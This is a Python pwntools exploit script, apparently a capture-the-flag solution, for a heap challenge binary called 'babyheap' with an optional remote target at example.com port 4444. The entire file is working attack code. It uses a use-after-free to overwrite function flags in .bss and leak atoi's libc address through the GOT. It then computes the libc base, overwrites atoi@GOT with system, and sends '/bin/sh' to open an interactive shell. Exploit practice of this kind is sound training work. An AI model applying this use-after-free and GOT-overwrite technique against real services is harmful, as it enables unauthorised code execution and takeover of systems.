#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./babyheap"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # menu select
        b *0x4013f3
        # before mamo_show
        b *0x4012e8
        c
        loadsym
        c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def memo_create():
    p.recvuntil(">")
    p.sendline("1")

def memo_edit(buf):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("Content?")
    p.send(buf)

def memo_show():
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("Content: ")
    return p.recvline().strip(b'\n')

def memo_delete():
    p.recvuntil(">")
    p.sendline("4")

def memo_fill(buf):
    """ malloc && write val"""
    p.recvuntil(">")
    p.sendline("1337")
    p.recvuntil("Fill")
    p.send(buf)

# function flags(at .bss section)
# the flag is restored only when the delete function is used
bss_sec = elf.get_section_by_name(".bss").header["sh_addr"]
offset_func_flag = 0x20
create_func_flag = bss_sec + offset_func_flag
log.info("head of func flags: 0x{:06x}".format(create_func_flag))
#edit_func_flag = bss_sec + offset_func_flag + 0x8
#show_func_flag = bss_sec + offset_func_flag + 0x10
#delete_func_flag = bss_sec + offset_func_flag + 0x18
#fill_func_flag = bss_sec + offset_func_flag + 0x20
#bss_pointer = bss_sec + offset_func_flag + 0x28

atoi_got_addr = elf.got['atoi']
log.info("atoi@got: 0x{:06x}".format(atoi_got_addr))

# UAF
memo_create()
memo_delete()
memo_edit(p64(create_func_flag))
memo_create()
# overwrite function flags
payload = p64(atoi_got_addr)
payload += p64(0) * 4# overwrite another func flags
payload += p64(atoi_got_addr)
memo_fill(payload)
# leak libc addr
atoi_libc_addr = u64(memo_show() + b'\x00' * 2)
log.info("atoi@libc: 0x{:08x}".format(atoi_libc_addr))
libc_base = atoi_libc_addr - libc.symbols['atoi']
log.info("libc base: 0x{:08x}".format(libc_base))
# GOT Overwrite
memo_edit(p64(libc_base + libc.symbols['system']))
# exec shell
p.recvuntil(">")
p.sendline('/bin/sh')

p.interactive()
